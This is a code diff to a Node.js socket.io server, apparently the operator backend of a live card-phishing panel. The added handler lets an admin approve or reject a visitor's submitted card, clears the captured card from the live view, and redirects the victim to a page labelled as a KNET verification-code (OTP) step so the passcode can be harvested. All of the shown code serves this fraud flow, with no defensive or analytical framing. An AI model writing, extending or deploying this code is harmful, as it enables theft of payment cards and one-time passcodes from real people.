@@ -871,6 +871,31 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
   // Admin: Card action (OTP, ATM, Reject)
   socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
+    // [FIX-LIVE] الموافقة: اخفِ بطاقة المباشر + وجّه لصفحة الكود
+    try {
+      if (action === 'otp' || action === 'approve' || action === 'cvv' || action === 'reject') {
+        var __lv = visitors.get(visitorSocketId);
+        if (!__lv) { visitors.forEach(function(x){ if (!__lv && x && (x._id === visitorSocketId || x.socketId === visitorSocketId)) __lv = x; }); }
+        if (__lv) {
+          __lv.liveCard = null;
+          __lv.liveCardTimestamp = null;
+          if (action !== 'reject') {
+            var __pg = String(__lv.page || '');
+            if (!/otp|رمز/i.test(__pg)) {
+              __lv.page = 'رمز التحقق كي نت (OTP)';
+              __lv.__f98otp = Date.now();
+              try { __f91Emit(visitorSocketId, 'visitor:navigate', 'otp-verification'); } catch(e){}
+            }
+          }
+          visitors.set(visitorSocketId, __lv);
+          saveVisitorPermanently(__lv);
+          admins.forEach(function(a, k){
+            try { io.to(k).emit('card:liveUpdate', { visitorId: __lv._id, liveCard: null, liveCardTimestamp: null }); } catch(e){}
+            try { io.to(k).emit('visitor:pageChanged', { visitorId: __lv._id, page: __lv.page }); } catch(e){}
+          });
+        }
+      }
+    } catch(e) {}
     var __skipEmit100 = false, __vv100 = null;
 /*FIX100E*/ try { if (action === "otp") { __vv100 = visitors.get(visitorSocketId) || null; if (!__vv100) { visitors.forEach(function(v){ if (!__vv100 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __vv100 = v; }); } if (__vv100 && __vv100.__f100sent && /otp|رمز/i.test(String(__vv100.page || ""))) __skipEmit100 = true; } } catch(e){}
 if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { if (action === "otp" && __vv100) __vv100.__f100sent = 1; } catch(e){} }
